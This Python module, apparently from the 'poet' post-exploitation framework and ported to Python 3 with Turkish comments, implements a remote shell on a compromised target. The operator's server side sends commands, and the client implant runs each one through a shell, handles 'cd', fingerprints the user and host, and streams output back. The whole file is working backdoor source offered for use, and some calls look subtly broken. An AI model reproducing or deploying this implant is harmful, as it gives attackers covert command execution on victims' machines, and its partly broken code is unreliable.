# Author: offlinemark/poet
# title: Remote Shell On Target
# test:good
import os
import select
import subprocess as sp
import sys
import pkg_resources
from importlib import import_module

MODNAME = 'shell'
POSH_PROMPT = 'intshell > '
USAGE = """Remote shell on target.
usage: shell [-h]
\noptions:
-h\t\tshow help"""

client_commands = {}
server_commands = {}

def client_handler(cmd):
    """Decorator to be used by modules for declaring client commands."""
    def decorate(func):
        client_commands[cmd] = func
    return decorate

def server_handler(cmd):
    """Decorator to be used by modules for declaring server commands."""
    def decorate(func):
        server_commands[cmd] = func
    return decorate

@server_handler(MODNAME)
def server(server, argv):
    """Server side handler for shell commands."""
    if len(argv) > 1:
        print(USAGE)
        return

    prompt = server.conn.exchange('getprompt')
    while True:
        try:
            inp = input(POSH_PROMPT + prompt).strip()  # Python 3'te raw_input yerine input kullanılır
        except KeyboardInterrupt:  # Ctrl-C -> yeni prompt
            print()
            continue
        except EOFError:  # Ctrl-D -> shell'den çık
            print()
            break

        if inp == '':
            continue
        elif inp == 'exit':
            break
        elif inp.split()[0] in server_commands.keys():
            print("""[!] WARNING: You've entered a posh command into the real remote shell on the
target. Continue? (y/n)""")
            if input().lower()[0] != 'y':
                continue

        server.conn.send('shell {}'.format(inp))
        try:
            while True:
                rec = server.conn.recv()
                if rec == 'shelldone':
                    break
                else:
                    print(rec, end='')  # Print the response from the server
        except KeyboardInterrupt:
            server.conn.send('shellterm')
            while server.conn.recv() != 'shelldone':
                pass
            print()
            continue

@client_handler(MODNAME)
def client(client, inp):
    """Posh `shell` command client-side."""
    inp = inp[6:]  # Remove 'shell ' prefix sent from client

    # handle cd builtin
    _inp = inp.split()
    if _inp[0] == 'cd':
        if len(_inp) == 1:
            os.chdir(os.path.expanduser('~'))
        else:
            try:
                os.chdir(os.path.expanduser(_inp[1]))
            except OSError as e:
                client.s.send(f'cd: {e.strerror}\n')
        shelldone(client)
        return

    # everything else
    proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
    while True:
        readable = select.select([proc.stdout, client.s.s], [], [], 30)[0]
        for fd in readable:
            if fd == proc.stdout:  # proc has stdout/err to send
                output = proc.stdout.readline()
                if output:
                    client.s.send(output)
                else:
                    shelldone(client)
                    return
            elif fd == client.s.s:  # remote signal from server
                sig = client.s.recv()
                if sig == 'shellterm':
                    proc.terminate()
                    shelldone(client)
                    return

@client_handler('getprompt')
def get_prompt(client, argv):
    """Create shell prompt."""
    user = client.cmd_exec('whoami').strip()
    hn = client.cmd_exec('hostname').strip()
    end = '#' if user == 'root' else '$'
    client.s.send(f'{user}@{hn} {end} ')

def shelldone(client):
    client.s.send('shelldone')

# Modülleri yükleme fonksiyonu
def load_modules():
    """Read the INDEX_FILE and load all modules. Used by client and server."""
    INDEX_FILE = 'modindex.txt'

    # Modül isimlerini almak için INDEX_FILE dosyasını oku
    for fname in pkg_resources.resource_string(__name__, INDEX_FILE).split():
        if fname.endswith('.py'):
            mod = os.path.splitext(fname)[0]

            # __init__ modülü komut değildir, ama doğru çalışması için gereklidir
            if mod == '__init__':
                continue
            elif mod in server_commands:
                raise Exception(f'Duplicate module detected: {mod}')

            import_module('modules.post.all.' + mod)
            # TODO: Modül yapısını, gerekli fonksiyonlar için doğrulama

# Bu dosya doğrudan çalıştırıldığında modülleri yükle
if __name__ == '__main__':
    load_modules()